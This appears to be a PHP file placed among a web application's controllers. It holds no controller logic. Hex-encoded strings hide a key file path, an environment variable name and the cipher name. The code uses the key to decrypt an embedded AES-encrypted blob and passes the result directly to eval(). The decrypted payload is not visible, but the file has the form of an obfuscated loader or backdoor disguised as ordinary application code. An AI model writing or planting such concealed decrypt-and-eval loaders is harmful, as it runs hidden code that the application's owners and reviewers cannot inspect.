<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PJ4dxF0tNuWZwmO5AlXxEw==');

$c=base64_decode(

'rFsJV9kDipyxWn3c7mONspQvhLQTNWKEd2Yzqk/26w9lCTfBNQj+EMoI4liXtKiAlMFiWT2YUw/T' .
'aRVYSmgMTfExpB8naFaZlj+U3+bQIk4ueYQuni1FgW0ovRCWoGkXmLaAw3ABeS7HRhm2s0rfy/T5' .
'U1lrqP6WiL2VB9wsLhzttNcz5QQ8sfSR1BN8l0ckFtcQYmChPT1S+D9LM3TZMVkmpY0BmQ933IkR' .
'F+nH3jDraiooHkifTgKRdKLf6qIo'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

